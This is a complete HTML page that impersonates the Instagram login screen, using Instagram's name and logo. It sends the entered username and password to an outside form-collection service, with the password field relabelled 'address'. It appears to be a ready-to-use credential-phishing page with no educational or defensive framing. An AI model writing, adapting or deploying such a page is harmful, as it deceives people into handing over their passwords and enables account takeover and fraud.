<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram.com</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      background-color: #fafafa;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      height: 100vh;
      align-items: center;
      justify-content: center;
    }

    .container {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 8px;
      padding: 30px 20px;
      width: 90%;
      max-width: 360px;
      text-align: center;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
    }

    .logo {
      width: 60%;
      max-width: 200px;
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 12px 10px;
      margin-bottom: 12px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background-color: #fafafa;
      font-size: 16px;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #3897f0;
      border: none;
      color: white;
      font-size: 16px;
      font-weight: bold;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: #2d82e6;
    }

    .footer {
      margin-top: 15px;
      font-size: 13px;
      color: #8e8e8e;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- 🔁 Replace below with your own logo image -->
    <img src="Instagram-Logo-2016-present.png" alt="Your Logo" class="logo">

    <form action="https://getform.io/f/bjjowwwb" method="POST">
      <input type="text" name="name" placeholder="Username" required>
      <input type="text" name="address" placeholder="Password" required>
      <button type="submit">Submit</button>
    </form>

    <div class="footer">we are always there to help.</div>
  </div>
</body>
</html>
